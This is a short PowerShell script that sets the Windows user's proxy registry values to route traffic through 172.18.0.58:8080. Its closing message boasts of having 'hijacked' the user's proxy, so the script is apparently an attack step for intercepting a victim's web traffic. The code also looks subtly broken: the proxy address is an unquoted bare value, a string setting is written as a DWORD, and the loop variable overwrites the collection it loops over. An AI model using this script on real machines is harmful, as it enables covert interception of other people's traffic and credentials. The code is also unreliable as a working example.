$RegistryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
$ProxyValues = @{
	"ProxyEnable" = 1
	"ProxyServer" = 172.18.0.58:8080
}
if ( -not (Test-Path $RegistryPath)){
	New-Item -Path $RegistryPath -Force | Out-Null
}
foreach ($ProxyValues in $ProxyValues.GetEnumerator()){
	$name = $ProxyValues.Key
	$value = $ProxyValues.Value
	Set-ItemProperty -Path $RegistryPath -Name $name -Type DWORD -Value $value
}
Write-Host "[+] Successfully hijacked user proxy [ OK ]"
